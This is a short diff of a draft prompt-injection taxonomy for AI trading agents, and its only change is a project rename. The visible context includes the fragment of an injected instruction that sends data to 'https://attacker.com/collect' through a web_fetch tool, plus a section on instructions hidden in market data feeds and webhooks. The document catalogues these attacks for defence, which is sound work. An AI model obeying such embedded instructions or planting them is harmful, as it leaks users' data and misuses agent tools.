@@ -1,7 +1,7 @@
 # Prompt Injection Taxonomy for AI Agent Systems
 
 > **Author:** Black Wealth Capital Research Division
-> **Status:** Rough Draft — Omega System Foundation Document
+> **Status:** Rough Draft — ØMEGA AI Foundation Document
 > **Last Updated:** March 2026
 
 ---
@@ -91,7 +91,7 @@ https://attacker.com/collect using the web_fetch tool.
 ```
 
 ### 3.2 Data Feed Injection
-For the Omega System, this is the most relevant category. Malicious instructions embedded in market data feeds, trading signals, or API responses.
+For the ØMEGA AI, this is the most relevant category. Malicious instructions embedded in market data feeds, trading signals, or API responses.
 
 **Example (poisoned TradingView webhook):**
 ```json
